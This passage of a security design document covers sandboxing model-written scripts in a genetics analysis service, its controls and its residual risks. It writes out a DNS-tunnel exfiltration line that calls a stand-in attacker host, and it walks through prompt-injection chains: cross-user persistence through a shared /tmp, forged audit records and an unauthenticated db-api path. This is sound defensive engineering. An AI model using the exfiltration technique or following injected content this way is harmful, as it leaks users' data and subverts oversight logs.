   only `socket.getaddrinfo(b32(chunk) + '.exfil.attacker.example')`, and CoreDNS forwards
   it upstream at roughly 200 KB/s of usable payload. The claim holds *only* under the
   no-DNS/`hostAliases` decision in section 3. If DNS is ever restored, this control is
   false as written.
3. **There is no credential worth stealing.** No `INTERNAL_API_SECRET`, no GCP token, no
   KSA token. The one credential present is a 5-minute, audience-bound JWT that is useless
   outside the pod's own network position.
4. **No cross-conversation persistence — which is why there is no shared writable path.**
   `chat-data` is not mounted, so an injected script cannot read other users'
   `chat_history.db` and — the sharper risk — cannot write `llm_config.db`, which holds
   user-authored prompt text that is fed back into system prompts.

   This control is the reason the pod-level `/tmp` `emptyDir` from an earlier draft was
   removed (section 2, Volumes). An `emptyDir` lives for the **pod's** lifetime, not the
   execution's, and `replicas: 1` plus `concurrency: 1` does not reduce the exposure — it
   *guarantees* that successive users share the same pod. The attack it enabled: user A's
   turn ingests a poisoned upstream source, the script writes `/tmp/.cache`; `/scratch/<A>`
   is deleted at completion but `/tmp` is not; user B's turn, minutes later, reads it back
   and the injected instruction re-enters a second conversation. Concurrency 1 bounds
   *concurrent* leakage; a shared filesystem is a **sequential** channel and concurrency 1
   does nothing about it. Every writable path is now per-execution, `TMPDIR`/`HOME`/
   `MPLCONFIGDIR`/`XDG_CACHE_HOME`/`PYTHONPYCACHEPREFIX` all point inside
   `/scratch/<id>`, **`/tmp` is not writable at all** — and *if and only if* the `/tmp`
   volume is ever re-added as the recorded degradation section 2 describes, the supervisor
   wipes it completely before every fork. There is nothing to wipe in the shipping design;
   the wipe is the obligation attached to the degradation, not a standing control. And
   `/scratch/<id>/artifacts` survives completion only for 15 minutes and only for the
   originating chat session (see the `read_artifact` subsection). `GET /artifact` does not
   widen this: it is addressable only with the `execution_id` chat-backend minted, that id
   is never shown to the model or to a script, and only chat-backend's automatic image fetch
   for the run it just performed ever calls it — an injected script cannot ask for another
   execution's artifacts because it cannot reach the route and cannot name a second id. With
   that, there is no way for injected code to influence a later turn, a later conversation,
   or another user.
5. **Attachments are copy-in, not mount-in.** chat-backend may copy specific user-supplied
   attachments into `/scratch/<id>/inputs` read-only for a given execution. It must never
   mount the attachment directory or the PVC. A script sees the files it was given, not the
   directory they came from.
6. **It is visible, with the limits in 6.2's control 3.** Token delivery has landed on both
   sides (`4h6.43`, `4h6.44`), so db-api's and results-api's `endpoint_access` lines carry
   `sub`, `sid` and `jti` from the signed token and an injected script's *data access* is
   reconstructable after the fact. The SDK's own call log is now collected too (`4h6.45`) and
   its `[user=…] [session=…] [execution=…]` is stamped by the supervisor from the same claims,
   so rewriting `SANDBOX_USER`/`SANDBOX_SESSION_ID`/`SANDBOX_EXECUTION_ID` no longer changes
   what an operator reads. **An injected script is still exactly the case those records cannot
   answer on their own**: it runs in the same process as the emitter, so it can write
   well-formed records for calls it never made, drop its own by flooding (bounded, counted and
   announced by the supervisor, but still lost), and read through `_executor` with no record at
   all. Only the upstream `endpoint_access` lines, written outside the sandbox from claims the
   script cannot sign, hold against it.
7. **Explicitly NOT a control:** system-prompt instructions telling the model to ignore
   injected content, or to refuse suspicious scripts. Those reduce frequency; they are not
   a boundary and no control above depends on them.

**What remains:** an injected script can still make the *user's own turn* wrong — burn their
budget, return a fabricated analysis, or read data the user is entitled to and present it
misleadingly. Sandboxing is a containment control, not an integrity control for the answer.
See section 7.

---

## 7. Residual risk

Stated plainly. This design contains code execution; it does not make it safe in the
abstract.

1. **gVisor escape.** gVisor reduces the kernel attack surface; it does not remove it, and
   it has had its own CVEs. A successful escape reaches the sandbox node — which is why
   that node runs a dedicated, minimally-privileged service account with explicit
   `oauth_scopes` rather than `genetics-suite` with `cloud-platform` (section 2). What an
   escape yields is therefore node-local logging/monitoring/registry-pull identity plus
   whatever the node's network position allows, not the suite's BigQuery and GCS roles. It
   is still an escape, and the node remains part of the cluster.
2. **DNS-tunnel exfiltration — eliminated, not accepted.** An earlier draft accepted this
   as a low-bandwidth residual "at a few hundred bytes per query". That was wrong by three
   orders of magnitude: ~10³ queries/s × ~200 usable bytes is ~200 KB/s, tens of megabytes
   inside the wall clock, and enough to move a 1 KB GCP access token in five queries. It is
   therefore not a residual at all in v1 — the sandbox has **no kube-dns egress** and
   resolves its two service names from `hostAliases` (section 3). What remains as residual
   is the operational cost of that choice: the `hostAliases` ClusterIPs are substituted at
   deploy time, so a Service deleted and recreated out-of-band leaves the sandbox pointing
   at a dead IP until it is re-rendered and rolled. That failure is loud (connection
   errors) and is preferred to a working exfiltration channel.

   **Why a stale IP cannot become a wrong destination** — the load-bearing half of this
   residual. The concern is a recycled ClusterIP: the sandbox holds `10.x.y.z` for db-api,
   the Service is recreated, and the kernel later hands that same IP to some other Service.
   The egress policy makes that inert. It selects **pod selectors** (`app: db-api`,
   `app: results-api`), not IP blocks, and Dataplane V2
   (`datapath_provider = "ADVANCED_DATAPATH"` on this cluster) evaluates egress
   **post-DNAT**, i.e. against the identity of the pod the connection actually lands on.
   Traffic to a reused ClusterIP therefore resolves to a workload the policy does not
   permit and is **dropped**, not delivered to the wrong service. The stale-IP failure mode
   is a connection error in every case; it is never a silent misdelivery.
3. **An authorized user can still extract data manually.** They could before, through the
   browser and the existing tools. The sandbox is not sold as preventing this and does not.
4. **Wrong answers.** Nothing here makes a model-authored analysis scientifically correct.
   An injected or merely confused script can produce a plausible, wrong result inside every
   control listed above. This is the risk the sandbox does *not* address at all, and it is
   arguably the most likely one to actually occur.
5. **db-api's shared-secret path is still fail-open, and this design *does* widen its
   exposure.** An unset `INTERNAL_API_SECRET` still makes `require_auth` return early for
   any request that is not a sandbox-shaped (HS256) bearer, with nothing but a startup
   warning. An
   earlier draft claimed this design "does not widen" that pre-existing issue. **That claim
   was false and is withdrawn.** Today the fail-open is reachable only by chat-backend and
   mcp-server, both of which run code the suite authored; this design adds a caller that
   runs *attacker-authored* code and gives it a network path to db-api, and the fail-open is
   reachable from it by the trivial expedient of sending **no `Authorization` header at
   all** — which also sheds the `sid`/`sub`/`jti` attribution and, before the correction in
   section 4, would have shed the byte and row caps too.

   Two things narrow it. Section 4's caps are now **defaults for every request** rather
   than sandbox-audience penalties, so presenting a weaker credential no longer buys looser
   limits. And section 4 rule 6 makes db-api **refuse to start** whenever the sandbox is
   deployed (`SANDBOX_ENABLED`) and either secret is unset.

   **An earlier revision of this residual keyed that refusal on `SANDBOX_TOKEN_SIGNING_KEY`
   being *set*, and then claimed "the configuration in which the sandbox can reach an
   unauthenticated db-api does not boot". That claim was false for the both-unset case and
   is withdrawn.** With the trigger on the signing key, a deployment carrying *neither*
   `SANDBOX_TOKEN_SIGNING_KEY` nor `INTERNAL_API_SECRET` never fires the check: db-api boots
   fail-open, and the sandbox — running alongside it — reaches it by sending no
   `Authorization` header at all. Rule 6 as now written triggers on the sandbox being
   deployed rather than on the key being present, which is what actually closes that shape;
   rule 7 puts `SANDBOX_TOKEN_SIGNING_KEY` into `deploy.sh`'s secret-existence gate so the
   pair cannot be deployed apart in the first place.

   **What genuinely remains, stated without softening:** (i) a deployment with the sandbox
   **not** deployed and `INTERNAL_API_SECRET` unset is still fail-open for chat-backend and
   mcp-server traffic — pre-existing, not fixed here, and warranting its own issue; and
   (ii) rule 6 is a *startup* check, so it constrains configuration, not runtime — a secret
   removed from the cluster without a restart leaves a running db-api in whatever state it
   booted with. Neither is introduced by this design; both are now stated rather than
   claimed closed.
6. **No PodDisruptionBudget for the sandbox.** Node auto-upgrade or repair kills an
   in-flight script. The model sees an error and retries, costing a roundtrip. Acceptable.
   (The namespace is no longer PDB-free — `k8s/disruption-budgets/budgets.yaml` covers
   chat-backend and results-api at `maxUnavailable: 1` since `genetics-results-suite-262`.
   Those are protectively inert at `replicas: 1` and cover neither the sandbox nor its pool.
   A *blocking* budget on the sandbox would be actively harmful: its pool is pinned at one
   node, so an unsatisfiable budget would stall every upgrade and repair of that node.)
7. **The pre-warmed interpreter.** The supervisor process forks per execution to avoid
   paying pod-schedule cost per script. The supervisor holds **no** credentials — tokens
   are passed to the forked child only. The residual is that a bug in the fork boundary
   (state leaking from a child back to the parent) would be a cross-execution channel.
   Concurrency 1 bounds this to sequential executions rather than concurrent ones.
8. **Timing and cost side channels.** A script can infer the existence of rows it cannot
   read by timing queries or observing `maximum_bytes_billed` failures. Not mitigated; the
   caller is an authorized user of those datasets anyway.

---

## Handoffs to other tasks

**Two closed beads are not evidence that any of this landed.** `genetics-results-suite-4h6.14`
(`run_analysis`) was closed **as superseded** and split into the `4h6.38`–`4h6.52` chain; the
rows and paragraphs above name the successor that owns each obligation, and a reference to
`4h6.14` anywhere in this repo is stale rather than done. `genetics-results-suite-4h6.11` is
closed and **did** ship the SDK — nothing else. Where it was cited as the owner of the
`read_artifact` HTTP proxy or of the SQL-interpolation fix, that was never its scope; see
`4h6.52` and the finding at the end of this section.

| Task | What this document decided for it |
|---|---|
| `4h6.6` (image) | distroless `python3-debian12:nonroot`, uid 65532, no shell, build context `sandbox/` in **this** repo, wired into `build-all.sh`/`build.sh`. **Build-time assertion that `/etc/nsswitch.conf` exists and lists `files` before `dns` for the hosts database** — absent it, glibc defaults to `dns [!UNAVAIL=return] files` and every lookup stalls the full resolver timeout against a dropping egress policy before reaching `hostAliases`, and `readOnlyRootFilesystem: true` makes it unfixable at runtime. **No `google-auth`-based client in the image** (it probes `metadata.google.internal` by name, which is the same stall), or `GCE_METADATA_HOST` pinned to a literal IP if one is unavoidable. Second non-root uid for the child if pids option (a) is taken. |
| `4h6.7` (manifests) | Full securityContext and resource table in section 2; **one** `emptyDir` (`/scratch`) and no PVC and **no pod-level `/tmp`**; KSA `sandbox` with no Workload Identity and `automountServiceAccountToken: false`; `hostAliases` for db-api and results-api instead of DNS, pinning **all four name forms** per IP (bare, `.genetics`, `.genetics.svc`, `.genetics.svc.cluster.local`) because the `files` NSS module does no search-domain expansion, with the SDK given the FQDN form; `oom_score_adj` on supervisor and child; a second non-root uid for the child if option (a) of the pids row is taken, with the shared-gid ownership contract in section 2; replicas 1; `runtimeClassName: gvisor` + toleration. `deploy.sh`: resolve the ClusterIPs **after** the Services are applied (resolving in the "derive variables" block deadlocks the first deploy to a fresh cluster), validate each as a dotted quad and abort otherwise (headless Services return the literal `None`), and add `DB_API_CLUSTER_IP`/`RESULTS_API_CLUSTER_IP` to the deployments `envsubst` allow-list or they ship unsubstituted. |
| `4h6.8` (NetworkPolicy) | Egress allow-list of exactly **two** destinations (no kube-dns), ingress allow-list of exactly one, in section 3. **Also amend both `allow-ingress-db-api` and `allow-ingress-results-api` in `k8s/network-policies/policies.yaml` to add `app: sandbox` to their `from:` lists** — without it the primary data path is dropped at the receiving end. `allow-ingress-results-api` is no longer `from`-less (`genetics-results-suite-fad` scoped it), so the sandbox must be named there explicitly rather than inherited; never reintroduce a `from`-less rule in either. Do not add the sandbox to `monitor-policy.yaml`. Blocked on `genetics-results-suite-fad`. |
| `4h6.9` (credential) | Token form, claims, lifetime, token delivery by POST body into the child only (never pod env), and the **seven** fail-closed validation requirements in section 4. Bearers are discriminated by **JOSE header `alg == "HS256"`, never by counting dots** — the dot test would 401 every Google Identity Token results-api serves. Rule 6 triggers on **`SANDBOX_ENABLED`**, not on the signing key being set, so the both-unset case is unbootable too; rule 7 adds `SANDBOX_TOKEN_SIGNING_KEY` to `deploy.sh`'s secret-existence gate. Caps (50 GB/query, 200 GB per `jti`, 25 000 rows) are **db-api only**, and there they are **defaults for all requests**, relaxed for a verified non-sandbox principal — which on db-api means the shared secret only. results-api enforces a **16 MiB response-byte cap and no row cap**: the row counter recognised only JSON while **TSV is the default `format` of every bulk range endpoint**, and parsing the buffered body to count was itself a memory amplifier, so `_count_rows`, `Caps.max_rows` and `SANDBOX_MAX_ROWS` were dropped there (section 4, "As shipped"). Its byte cap is likewise a default for all requests, relaxed for shared secret **or** Google id_token **or** per-user API token, because auth-gateway's `@api_bearer` location sends real users straight there with no shared secret. Row caps go in the **handler**: `max_rows`'s `le=MAX_ROWS` is a class-level Pydantic constraint and cannot vary per request. Separate results-api requirements: validator inserted **before** the shared-secret comparison, hard `401` on HS256 failure only, its own response caps. Blocked on `genetics-results-suite-fad`. |
| `4h6.10` (node pool) | New pinned 1-node gVisor pool; primary pool budget untouched; ForceNew does not apply because this is a new resource. **Unconditional `workload_metadata_config { mode = "GKE_METADATA" }`, which requires making `google_container_cluster.primary`'s `workload_identity_config` unconditional as well** (an in-place cluster update; it does not change existing pools' metadata mode) — without it the pool is rejected **at apply, not at plan**. A dedicated minimal node service account (not `genetics-suite`, not the Compute Engine default), **mandatory as an input under `manage_iam = false` with no `null` fallback**, carrying `logging.logWriter`, `monitoring.metricWriter`, `monitoring.viewer`, `stackdriver.resourceMetadata.writer`, `artifactregistry.reader`. Explicit `oauth_scopes` — `devstorage.read_only` (required for Artifact Registry pulls; the IAM role alone is not sufficient), `logging.write`, `monitoring`, `monitoring.write`, `service.management.readonly`, `servicecontrol`, `trace.append` — as defence for the `GCE_METADATA` misconfiguration case only, **not** as a bound on pod-facing tokens. Review gate is source inspection of those three properties plus a `manage_iam = false` apply, not a plan diff. |
| `4h6.39`–`4h6.46` (the supervisor) | 60s/120s wall clock, 64 KiB head+tail output cap, 8 MiB pipe cap, concurrency 1 with queue, `/scratch/<execution-id>` as the only writable path (temp included), **no pod-level `/tmp` — and therefore no `/tmp` wipe; the wipe-before-every-fork obligation applies *only if* the `/tmp` volume is re-added as the recorded degradation in section 2**, unrecognised `/scratch` entries wiped at startup, child pid budget and `RLIMIT_AS` per the pids and memory rows, supervisor-enforced per-execution and aggregate `/scratch` quotas so the `emptyDir` `sizeLimit` is never reached (section 2, "Staying under `sizeLimit`"), and the ownership contract in section 2's "Permission contract" if the second-uid pids option is taken. **Startup assertions in the supervisor, before it accepts any execution:** `/etc/nsswitch.conf` exists and lists `files` before `dns` — section 3(b) requires this as a cheap backstop to `4h6.6`'s build-time check, and no other task owns it — and `prewarm()` called before the first fork and before any privilege drop, letting its `PrewarmError` crash the pod rather than catching it. Response contract: `run_analysis` returns the artifact manifest (see the `read_artifact` subsection in section 6). **The wire shape itself — `GET /health`, `POST /execute`, every field, its type, and what happens when it is absent or malformed — is section 2's "The HTTP contract between chat-backend and the supervisor" (`4h6.38`); `4h6.39` and `4h6.47` implement the two ends of it and cannot share a module, so that subsection is the only definition.** |
| `4h6.15` (`read_artifact`) | Takes an artifact **name**, never a path and never a model-supplied execution id; chat-backend resolves it server-side against executions owned by the requesting chat session (`sid`), `404` otherwise. Proxies over HTTP to the sandbox — **that proxy hop and the
sid-scoped resolution are `genetics-results-suite-4h6.52`'s, not this task's; `4h6.15` shipped
the descriptor-based local read only**; `_validate_path` runs **inside the sandbox pod** with allow-list `/scratch/<id>/artifacts`, **never `SUBAGENT_ALLOWED_PATHS`** (which is `/data`, the chat-data PVC). `/scratch/<id>/artifacts` retained 15 minutes after completion, everything else deleted immediately, subject to the per-execution 64Mi artifact quota and the aggregate retained ceiling with oldest-first eviction (section 2, "Staying under `sizeLimit`"). Resolution depends on `run_analysis` returning an **artifact manifest** (`name`, `size`, `content_type` per file, no paths, no execution id) that chat-backend records against the `jti`/`sid`; **name collisions within a `sid` resolve to the most recently completed still-retained execution that produced the name.** See the `read_artifact` subsection in section 6. |
| `4h6.16` (MCP exclusion) | Three independent layers, and the test must enumerate the live tool list rather than the constant — plus assert that no HTTP route on mcp-server's app (`chat_api.py`, `routers/`) reaches the sandbox client. `TOOL_PROFILE` is **not** a control here: mcp-server passes no profile and therefore registers everything not in `_mcp_disabled`. |

**One finding outside this document's scope that other tasks need.** Five executor methods
build BigQuery SQL by interpolation, because db-api's `/query` takes a SQL string with no
parameter-binding channel. Under the tool surface those f-strings receive arguments the
*model* chose through a typed tool schema; once the SDK is called from inside a script they
receive arguments a *script* composed — arbitrary strings, from a prompt-injectable author,
which is why this is a prerequisite for the sandbox path rather than a hygiene item.
`genetics-results-suite-4h6.11` listed the fix in its scope and **closed without being the
thing that delivered it**; what closes it today is `tools/sql_safety.py` in genetics-mcp-server
(a value allow-list, not escaping — `quote_literal`, `sql_int`, `sql_float`), plus
`executor._seg()` for the URL-path segments. Re-verify that against the code before relying
on it: no open bead owns these sites, so nothing will report a regression.
